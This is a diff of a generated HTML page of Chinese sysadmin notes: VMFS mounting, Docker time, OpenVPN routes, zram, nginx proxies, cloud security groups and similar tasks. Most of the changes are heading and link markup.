-<p><a href="https://aimuke.github.io/linux/2019/05/29/redirect/" target="_blank" rel="noopener noreferrer">https://aimuke.github.io/linux/2019/05/29/redirect/</a></p>
+<h2 id="标准重定向">
+  标准重定向
+  <a class="heading-link" href="#%e6%a0%87%e5%87%86%e9%87%8d%e5%ae%9a%e5%90%91">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<blockquote>
+<p><a href="https://aimuke.github.io/linux/2019/05/29/redirect/"  class="external-link" target="_blank" rel="noopener">https://aimuke.github.io/linux/2019/05/29/redirect/</a></p>
 </blockquote>
 <table>
   <thead>
@@ -909,11 +923,17 @@
       </tr>
   </tbody>
 </table>
-<h1 id="linux-下挂载-esxi-的-vmfs-文件系统" class="headerLink">
-    <a href="#linux-%e4%b8%8b%e6%8c%82%e8%bd%bd-esxi-%e7%9a%84-vmfs-%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f" class="header-mark"></a>linux 下挂载 esxi 的 vmfs 文件系统</h1><p><code>vmfs</code> 是<code>esxi</code>的文件系统,物理机使用<code>esxi</code>虚拟化后硬盘的文件格式就是这个. <code>linux</code>下可以直接将其挂在到本地
+<h1 id="linux-下挂载-esxi-的-vmfs-文件系统">
+  linux 下挂载 esxi 的 vmfs 文件系统
+  <a class="heading-link" href="#linux-%e4%b8%8b%e6%8c%82%e8%bd%bd-esxi-%e7%9a%84-vmfs-%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p><code>vmfs</code> 是<code>esxi</code>的文件系统,物理机使用<code>esxi</code>虚拟化后硬盘的文件格式就是这个. <code>linux</code>下可以直接将其挂在到本地
 <code>vmfs-tools</code>是<code>linux</code>挂载<code>vmfs</code>的驱动程序(应该也可以挂在<code>vmdk</code>文件,<em>我没有试过</em>),默认在<code>ubuntu</code>上已获得支持,<code>fedora</code>上可以直接将<code>ubuntu</code>上的安装程序复制过来也可以直接使用.</p>
 <blockquote>
-<p><a href="https://github.com/glandium/vmfs-tools" target="_blank" rel="noopener noreferrer">https://github.com/glandium/vmfs-tools</a></p>
+<p><a href="https://github.com/glandium/vmfs-tools"  class="external-link" target="_blank" rel="noopener">https://github.com/glandium/vmfs-tools</a></p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -925,8 +945,14 @@
 </span></span><span class="line"><span class="cl">vmfs-fuse /dev/sdc1 /mnt/sdc 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="cp-mv-进度条补丁" class="headerLink">
-    <a href="#cp-mv-%e8%bf%9b%e5%ba%a6%e6%9d%a1%e8%a1%a5%e4%b8%81" class="header-mark"></a>cp mv 进度条补丁</h1><div class="highlight"><div class="chroma">
+</div><h1 id="cp-mv-进度条补丁">
+  cp mv 进度条补丁
+  <a class="heading-link" href="#cp-mv-%e8%bf%9b%e5%ba%a6%e6%9d%a1%e8%a1%a5%e4%b8%81">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -974,8 +1000,14 @@
 </span></span><span class="line"><span class="cl">$ sudo cp src/mv /usr/local/bin/mv
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="更改docker容器中的时间而不影响宿主机" class="headerLink">
-    <a href="#%e6%9b%b4%e6%94%b9docker%e5%ae%b9%e5%99%a8%e4%b8%ad%e7%9a%84%e6%97%b6%e9%97%b4%e8%80%8c%e4%b8%8d%e5%bd%b1%e5%93%8d%e5%ae%bf%e4%b8%bb%e6%9c%ba" class="header-mark"></a>更改docker容器中的时间而不影响宿主机</h1><div class="highlight"><div class="chroma">
+</div><h1 id="更改docker容器中的时间而不影响宿主机">
+  更改docker容器中的时间而不影响宿主机
+  <a class="heading-link" href="#%e6%9b%b4%e6%94%b9docker%e5%ae%b9%e5%99%a8%e4%b8%ad%e7%9a%84%e6%97%b6%e9%97%b4%e8%80%8c%e4%b8%8d%e5%bd%b1%e5%93%8d%e5%ae%bf%e4%b8%bb%e6%9c%ba">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1003,8 +1035,14 @@
 </span></span><span class="line"><span class="cl">$&gt;&gt; <span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="ubuntudebian切换shelldashbash" class="headerLink">
-    <a href="#ubuntudebian%e5%88%87%e6%8d%a2shelldashbash" class="header-mark"></a>ubuntu/debian切换shell（dash/bash）</h1><div class="highlight"><div class="chroma">
+</div><h1 id="ubuntudebian切换shelldashbash">
+  ubuntu/debian切换shell（dash/bash）
+  <a class="heading-link" href="#ubuntudebian%e5%88%87%e6%8d%a2shelldashbash">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1014,9 +1052,15 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># 弹出窗口选择 &lt;No&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="openvpn-指定路由配置" class="headerLink">
-    <a href="#openvpn-%e6%8c%87%e5%ae%9a%e8%b7%af%e7%94%b1%e9%85%8d%e7%bd%ae" class="header-mark"></a>openvpn 指定路由配置</h1><blockquote>
-<p><a href="https://blog.csdn.net/joshua317/article/details/120245443" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/joshua317/article/details/120245443</a></p>
+</div><h1 id="openvpn-指定路由配置">
+  openvpn 指定路由配置
+  <a class="heading-link" href="#openvpn-%e6%8c%87%e5%ae%9a%e8%b7%af%e7%94%b1%e9%85%8d%e7%bd%ae">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<blockquote>
+<p><a href="https://blog.csdn.net/joshua317/article/details/120245443"  class="external-link" target="_blank" rel="noopener">https://blog.csdn.net/joshua317/article/details/120245443</a></p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1034,8 +1078,14 @@
 </span></span><span class="line"><span class="cl">route 140.143.61.12 255.255.255.255  vpn_gateway
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="svg-背景透明图片" class="headerLink">
-    <a href="#svg-%e8%83%8c%e6%99%af%e9%80%8f%e6%98%8e%e5%9b%be%e7%89%87" class="header-mark"></a>svg 背景透明图片</h1><div class="highlight"><div class="chroma">
+</div><h1 id="svg-背景透明图片">
+  svg 背景透明图片
+  <a class="heading-link" href="#svg-%e8%83%8c%e6%99%af%e9%80%8f%e6%98%8e%e5%9b%be%e7%89%87">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1053,9 +1103,15 @@
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="centos-启用zram服务器内存过低可用于替代swap" class="headerLink">
-    <a href="#centos-%e5%90%af%e7%94%a8zram%e6%9c%8d%e5%8a%a1%e5%99%a8%e5%86%85%e5%ad%98%e8%bf%87%e4%bd%8e%e5%8f%af%e7%94%a8%e4%ba%8e%e6%9b%bf%e4%bb%a3swap" class="header-mark"></a>CentOS 启用zram(服务器内存过低，可用于替代swap)</h1><blockquote>
-<p><a href="https://fedoraproject.org/wiki/Changes/SwapOnZRAM" target="_blank" rel="noopener noreferrer">https://fedoraproject.org/wiki/Changes/SwapOnZRAM</a></p>
+</div><h1 id="centos-启用zram服务器内存过低可用于替代swap">
+  CentOS 启用zram(服务器内存过低，可用于替代swap)
+  <a class="heading-link" href="#centos-%e5%90%af%e7%94%a8zram%e6%9c%8d%e5%8a%a1%e5%99%a8%e5%86%85%e5%ad%98%e8%bf%87%e4%bd%8e%e5%8f%af%e7%94%a8%e4%ba%8e%e6%9b%bf%e4%bb%a3swap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<blockquote>
+<p><a href="https://fedoraproject.org/wiki/Changes/SwapOnZRAM"  class="external-link" target="_blank" rel="noopener">https://fedoraproject.org/wiki/Changes/SwapOnZRAM</a></p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1123,8 +1179,14 @@
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;lzo&#34;</span> <span class="p">|</span> sudo tee /sys/block/zram0/comp_algorithm
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="virtualbox-nat端口映射配置" class="headerLink">
-    <a href="#virtualbox-nat%e7%ab%af%e5%8f%a3%e6%98%a0%e5%b0%84%e9%85%8d%e7%bd%ae" class="header-mark"></a>virtualbox NAT端口映射配置</h1><p><code>windows</code> 和 <code>linux</code>命令应一致(只测试过<code>windows</code>)，用于快速批量映射</p>
+</div><h1 id="virtualbox-nat端口映射配置">
+  virtualbox NAT端口映射配置
+  <a class="heading-link" href="#virtualbox-nat%e7%ab%af%e5%8f%a3%e6%98%a0%e5%b0%84%e9%85%8d%e7%bd%ae">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p><code>windows</code> 和 <code>linux</code>命令应一致(只测试过<code>windows</code>)，用于快速批量映射</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1135,8 +1197,14 @@
 </span></span><span class="line"><span class="cl">VBoxManage natnetwork modify --netname <span class="s2">&#34;10.0.2.0/24&#34;</span> --port-forward-4 <span class="s2">&#34;172.16.10.230-2222:tcp:[172.16.10.230]:2222:[10.0.2.230]:2222&#34;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="单位换算" class="headerLink">
-    <a href="#%e5%8d%95%e4%bd%8d%e6%8d%a2%e7%ae%97" class="header-mark"></a>单位换算</h2><div class="highlight"><div class="chroma">
+</div><h2 id="单位换算">
+  单位换算
+  <a class="heading-link" href="#%e5%8d%95%e4%bd%8d%e6%8d%a2%e7%ae%97">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1148,8 +1216,14 @@
 </span></span><span class="line"><span class="cl"><span class="k">-</span> <span class="sb">`1 MB/s`</span>(`Megabytes`/`MBytes`/`兆字节每秒`) 等于 <span class="sb">`8 Mb/s`</span>(`兆比特每秒`/`Megabits`/`MBits`)。
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="mailx-smtp使用ssl时邮件发送报错-error-in-certificate-peers-certificate-issuer-is-not-recognized" class="headerLink">
-    <a href="#mailx-smtp%e4%bd%bf%e7%94%a8ssl%e6%97%b6%e9%82%ae%e4%bb%b6%e5%8f%91%e9%80%81%e6%8a%a5%e9%94%99-error-in-certificate-peers-certificate-issuer-is-not-recognized" class="header-mark"></a>mailx smtp使用ssl时，邮件发送报错 &ldquo;Error in certificate: Peer’s certificate issuer is not recognized.&rdquo;</h2><div class="highlight"><div class="chroma">
+</div><h2 id="mailx-smtp使用ssl时邮件发送报错-error-in-certificate-peers-certificate-issuer-is-not-recognized">
+  mailx smtp使用ssl时，邮件发送报错 &ldquo;Error in certificate: Peer’s certificate issuer is not recognized.&rdquo;
+  <a class="heading-link" href="#mailx-smtp%e4%bd%bf%e7%94%a8ssl%e6%97%b6%e9%82%ae%e4%bb%b6%e5%8f%91%e9%80%81%e6%8a%a5%e9%94%99-error-in-certificate-peers-certificate-issuer-is-not-recognized">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1177,8 +1251,14 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># 修改 /etc/mail.rc 末尾添加,即可 set nss-config-dir=/etc/mail.rc.d </span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="jenkins-设置国内插件源" class="headerLink">
-    <a href="#jenkins-%e8%ae%be%e7%bd%ae%e5%9b%bd%e5%86%85%e6%8f%92%e4%bb%b6%e6%ba%90" class="header-mark"></a>jenkins 设置国内插件源</h2><div class="highlight"><div class="chroma">
+</div><h2 id="jenkins-设置国内插件源">
+  jenkins 设置国内插件源
+  <a class="heading-link" href="#jenkins-%e8%ae%be%e7%bd%ae%e5%9b%bd%e5%86%85%e6%8f%92%e4%bb%b6%e6%ba%90">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1188,8 +1268,14 @@
 </span></span><span class="line"><span class="cl"><span class="na">Jenkins管理界面中打开“Manage Plugins”（管理插件），然后选择“Advanced”（高级选项）标签页，在“Update Site”下拉列表中添加上述地址，并单击“Apply”（应用）按钮即可</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="etcsysconfignetwork-scripts-为空" class="headerLink">
-    <a href="#etcsysconfignetwork-scripts-%e4%b8%ba%e7%a9%ba" class="header-mark"></a>/etc/sysconfig/network-scripts 为空</h1><ul>
+</div><h1 id="etcsysconfignetwork-scripts-为空">
+  /etc/sysconfig/network-scripts 为空
+  <a class="heading-link" href="#etcsysconfignetwork-scripts-%e4%b8%ba%e7%a9%ba">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li>本来 <code>/etc/sysconfig/network-scripts</code> 下是有网卡的配置文件的，我不知道是做了什么事情(我记得只是在调路由表)，在操作了几次后，我就发现我的网卡配置文件都没了，但是网络连接却是正常的，后面经多方资料查询，发现是<code>NetworkManager</code>，他会自动管理网卡，而由他管理的话，那么就可能不再需要<code>/etc/sysconfig/network-scripts/</code>下的配置文件了。他的默认配置文件是在<code>/etc/NetworkManager/system-connections</code>下</li>
 <li>如何继续使用<code>/etc/sysconfig/network-scripts</code>下的配置文件来继续管理网卡呢</li>
 </ul>
@@ -1227,16 +1313,34 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># 用于控制系统在扫描Wi-Fi网络时是否使用随机MAC地址。具体来说，如果将该选项设置为“no”，则系统会使用真实的MAC地址扫描Wi-Fi网络。</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="双网卡优先级配置" class="headerLink">
-    <a href="#%e5%8f%8c%e7%bd%91%e5%8d%a1%e4%bc%98%e5%85%88%e7%ba%a7%e9%85%8d%e7%bd%ae" class="header-mark"></a>双网卡优先级配置</h1><ul>
+</div><h1 id="双网卡优先级配置">
+  双网卡优先级配置
+  <a class="heading-link" href="#%e5%8f%8c%e7%bd%91%e5%8d%a1%e4%bc%98%e5%85%88%e7%ba%a7%e9%85%8d%e7%bd%ae">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li>网卡配置文件中 添加<code>IPV4_ROUTE_METRIC</code>参数，值越低，优先级越高</li>
 </ul>
-<h1 id="网卡连接后执行某个脚本" class="headerLink">
-    <a href="#%e7%bd%91%e5%8d%a1%e8%bf%9e%e6%8e%a5%e5%90%8e%e6%89%a7%e8%a1%8c%e6%9f%90%e4%b8%aa%e8%84%9a%e6%9c%ac" class="header-mark"></a>网卡连接后执行某个脚本</h1><ul>
+<h1 id="网卡连接后执行某个脚本">
+  网卡连接后执行某个脚本
+  <a class="heading-link" href="#%e7%bd%91%e5%8d%a1%e8%bf%9e%e6%8e%a5%e5%90%8e%e6%89%a7%e8%a1%8c%e6%9f%90%e4%b8%aa%e8%84%9a%e6%9c%ac">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li>脚本存放位置: <code>/etc/NetworkManager/dispatcher.d</code></li>
 </ul>
-<h1 id="网卡配置文件固定路由设置" class="headerLink">
-    <a href="#%e7%bd%91%e5%8d%a1%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e5%9b%ba%e5%ae%9a%e8%b7%af%e7%94%b1%e8%ae%be%e7%bd%ae" class="header-mark"></a>网卡配置文件固定路由设置</h1><ol>
+<h1 id="网卡配置文件固定路由设置">
+  网卡配置文件固定路由设置
+  <a class="heading-link" href="#%e7%bd%91%e5%8d%a1%e9%85%8d%e7%bd%ae%e6%96%87%e4%bb%b6%e5%9b%ba%e5%ae%9a%e8%b7%af%e7%94%b1%e8%ae%be%e7%bd%ae">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ol>
 <li>关闭网卡自动路由功能</li>
 </ol>
 <div class="highlight"><div class="chroma">
@@ -1266,10 +1370,22 @@
 </span></span><span class="line"><span class="cl"><span class="nv">GATEWAY0</span><span class="o">=</span>&lt;172.16.31.1&gt; 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="acmesh-证书安装---reloadcmd无效问题" class="headerLink">
-    <a href="#acmesh-%e8%af%81%e4%b9%a6%e5%ae%89%e8%a3%85---reloadcmd%e6%97%a0%e6%95%88%e9%97%ae%e9%a2%98" class="header-mark"></a>acme.sh 证书安装 <code>--reloadcmd</code>无效问题</h1><p>一般来说，我们在使用自动续签证书的时候，需要让<code>acme.sh</code>更新证书后自动重载一下<code>nginx</code>,但是我们的<code>nginx</code>基本都是自编译的，所以得使用<code>acme.sh</code>的<code>--reloadcmd</code>参数，但实际上在初始化时候如果你没有指定<code>--reloadcmd</code>,那么第一次部署后即使你在更新的自动任务中添加<code>--reloadcmd</code>也是无效的，这个时候可以直接修改配置证书的配置文件<code>/root/.acme.sh/example.com/example.com.conf</code>，在里面添加一行<code>Le_ReloadCmd='/usr/bin/systemctl restart nginx.service'</code>就可以了。当然，也可以在初始安装证书的时候添加<code>--reloadcmd</code>参数，他会给你自动加入这个参数到配置文件中.</p>
-<h1 id="openai-api接口反向代理实现国内直接使用" class="headerLink">
-    <a href="#openai-api%e6%8e%a5%e5%8f%a3%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e5%ae%9e%e7%8e%b0%e5%9b%bd%e5%86%85%e7%9b%b4%e6%8e%a5%e4%bd%bf%e7%94%a8" class="header-mark"></a>openai api接口反向代理实现国内直接使用</h1><ul>
+</div><h1 id="acmesh-证书安装---reloadcmd无效问题">
+  acme.sh 证书安装 <code>--reloadcmd</code>无效问题
+  <a class="heading-link" href="#acmesh-%e8%af%81%e4%b9%a6%e5%ae%89%e8%a3%85---reloadcmd%e6%97%a0%e6%95%88%e9%97%ae%e9%a2%98">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p>一般来说，我们在使用自动续签证书的时候，需要让<code>acme.sh</code>更新证书后自动重载一下<code>nginx</code>,但是我们的<code>nginx</code>基本都是自编译的，所以得使用<code>acme.sh</code>的<code>--reloadcmd</code>参数，但实际上在初始化时候如果你没有指定<code>--reloadcmd</code>,那么第一次部署后即使你在更新的自动任务中添加<code>--reloadcmd</code>也是无效的，这个时候可以直接修改配置证书的配置文件<code>/root/.acme.sh/example.com/example.com.conf</code>，在里面添加一行<code>Le_ReloadCmd='/usr/bin/systemctl restart nginx.service'</code>就可以了。当然，也可以在初始安装证书的时候添加<code>--reloadcmd</code>参数，他会给你自动加入这个参数到配置文件中.</p>
+<h1 id="openai-api接口反向代理实现国内直接使用">
+  openai api接口反向代理实现国内直接使用
+  <a class="heading-link" href="#openai-api%e6%8e%a5%e5%8f%a3%e5%8f%8d%e5%90%91%e4%bb%a3%e7%90%86%e5%ae%9e%e7%8e%b0%e5%9b%bd%e5%86%85%e7%9b%b4%e6%8e%a5%e4%bd%bf%e7%94%a8">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li>
 <p><code>nginx</code> 反向代理设置(仅示例)</p>
 <div class="highlight"><div class="chroma">
@@ -1480,8 +1596,14 @@
 </div>
 </div></li>
 </ul>
-<h1 id="云安全组配置规范" class="headerLink">
-    <a href="#%e4%ba%91%e5%ae%89%e5%85%a8%e7%bb%84%e9%85%8d%e7%bd%ae%e8%a7%84%e8%8c%83" class="header-mark"></a>云安全组配置规范</h1><p>不同的云厂商他的云策略是有差异的，阿里云的云安全组是以优先级来判定的规则先后的(1-100)数字越小，优先级越高。腾讯云为顺序判定，与iptables类似，从上向下。亚马逊无要求，默认拒绝所有流量。需主动配置内外网策略(未详细测试)</p>
+<h1 id="云安全组配置规范">
+  云安全组配置规范
+  <a class="heading-link" href="#%e4%ba%91%e5%ae%89%e5%85%a8%e7%bb%84%e9%85%8d%e7%bd%ae%e8%a7%84%e8%8c%83">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p>不同的云厂商他的云策略是有差异的，阿里云的云安全组是以优先级来判定的规则先后的(1-100)数字越小，优先级越高。腾讯云为顺序判定，与iptables类似，从上向下。亚马逊无要求，默认拒绝所有流量。需主动配置内外网策略(未详细测试)</p>
 <p>云策略规则部署规范(以阿里云为例)</p>
 <ol>
 <li>默认放行所有公网出流量(此项默认，可不做修改。优先级:1 )</li>
@@ -1494,12 +1616,24 @@
 <li>建议每个受信组单独建立一个安全组，方便管理。</li>
 <li>建议配合云策略和服务器防火墙共同使用。</li>
 </ol>
-<h1 id="webmin-密码修改" class="headerLink">
-    <a href="#webmin-%e5%af%86%e7%a0%81%e4%bf%ae%e6%94%b9" class="header-mark"></a>webmin 密码修改</h1><ul>
+<h1 id="webmin-密码修改">
+  webmin 密码修改
+  <a class="heading-link" href="#webmin-%e5%af%86%e7%a0%81%e4%bf%ae%e6%94%b9">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li><code>/usr/libexec/webmin/changepass.pl /etc/webmin &lt;user&gt; &lt;passwd&gt;</code></li>
 </ul>
-<h1 id="记录一个nginx-反代规则" class="headerLink">
-    <a href="#%e8%ae%b0%e5%bd%95%e4%b8%80%e4%b8%aanginx-%e5%8f%8d%e4%bb%a3%e8%a7%84%e5%88%99" class="header-mark"></a>记录一个nginx 反代规则</h1><div class="highlight"><div class="chroma">
+<h1 id="记录一个nginx-反代规则">
+  记录一个nginx 反代规则
+  <a class="heading-link" href="#%e8%ae%b0%e5%bd%95%e4%b8%80%e4%b8%aanginx-%e5%8f%8d%e4%bb%a3%e8%a7%84%e5%88%99">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1519,8 +1653,14 @@
 </span></span><span class="line"><span class="cl"><span class="o">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="debian-pull-镜像-408-错误" class="headerLink">
-    <a href="#debian-pull-%e9%95%9c%e5%83%8f-408-%e9%94%99%e8%af%af" class="header-mark"></a>debian pull 镜像 408 错误</h1><div class="highlight"><div class="chroma">
+</div><h1 id="debian-pull-镜像-408-错误">
+  debian pull 镜像 408 错误
+  <a class="heading-link" href="#debian-pull-%e9%95%9c%e5%83%8f-408-%e9%94%99%e8%af%af">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1532,8 +1672,14 @@
 </span></span><span class="line"><span class="cl">sudo ip link <span class="nb">set</span> dev eth0 mtu <span class="m">1450</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="在bash脚本中使用别名alias的方式" class="headerLink">
-    <a href="#%e5%9c%a8bash%e8%84%9a%e6%9c%ac%e4%b8%ad%e4%bd%bf%e7%94%a8%e5%88%ab%e5%90%8dalias%e7%9a%84%e6%96%b9%e5%bc%8f" class="header-mark"></a>在bash脚本中使用别名(alias)的方式</h1><div class="highlight"><div class="chroma">
+</div><h1 id="在bash脚本中使用别名alias的方式">
+  在bash脚本中使用别名(alias)的方式
+  <a class="heading-link" href="#%e5%9c%a8bash%e8%84%9a%e6%9c%ac%e4%b8%ad%e4%bd%bf%e7%94%a8%e5%88%ab%e5%90%8dalias%e7%9a%84%e6%96%b9%e5%bc%8f">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -1543,9 +1689,15 @@
 </span></span><span class="line"><span class="cl"><span class="nb">shopt</span> -s expand_aliases
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="rabbitmq-ssl-证书配置" class="headerLink">
-    <a href="#rabbitmq-ssl-%e8%af%81%e4%b9%a6%e9%85%8d%e7%bd%ae" class="header-mark"></a>rabbitmq ssl 证书配置</h2><blockquote>
-<p><a href="https://www.cnblogs.com/hellxz/p/15776987.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/hellxz/p/15776987.html</a></p>
+</div><h2 id="rabbitmq-ssl-证书配置">
+  rabbitmq ssl 证书配置
+  <a class="heading-link" href="#rabbitmq-ssl-%e8%af%81%e4%b9%a6%e9%85%8d%e7%bd%ae">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<blockquote>
+<p><a href="https://www.cnblogs.com/hellxz/p/15776987.html"  class="external-link" target="_blank" rel="noopener">https://www.cnblogs.com/hellxz/p/15776987.html</a></p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1561,8 +1713,14 @@
 </span></span><span class="line"><span class="cl">sh create_client_cert.sh rabbitmq-client &lt;client_passwd&gt;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="prometheus-不同指标计间的计算方法" class="headerLink">
-    <a href="#prometheus-%e4%b8%8d%e5%90%8c%e6%8c%87%e6%a0%87%e8%ae%a1%e9%97%b4%e7%9a%84%e8%ae%a1%e7%ae%97%e6%96%b9%e6%b3%95" class="header-mark"></a>prometheus 不同指标计间的计算方法</h2><div class="highlight"><div class="chroma">
+</div><h2 id="prometheus-不同指标计间的计算方法">
+  prometheus 不同指标计间的计算方法
+  <a class="heading-link" href="#prometheus-%e4%b8%8d%e5%90%8c%e6%8c%87%e6%a0%87%e8%ae%a1%e9%97%b4%e7%9a%84%e8%ae%a1%e7%ae%97%e6%96%b9%e6%b3%95">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1594,8 +1752,14 @@
 </span></span><span class="line"><span class="cl"><span class="na">redis_memory_used_bytes / on(hostname) group_left node_memory_MemTotal_bytes</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="iis-http-强制跳转-https" class="headerLink">
-    <a href="#iis-http-%e5%bc%ba%e5%88%b6%e8%b7%b3%e8%bd%ac-https" class="header-mark"></a>IIS http 强制跳转 https</h2><ul>
+</div><h2 id="iis-http-强制跳转-https">
+  IIS http 强制跳转 https
+  <a class="heading-link" href="#iis-http-%e5%bc%ba%e5%88%b6%e8%b7%b3%e8%bd%ac-https">
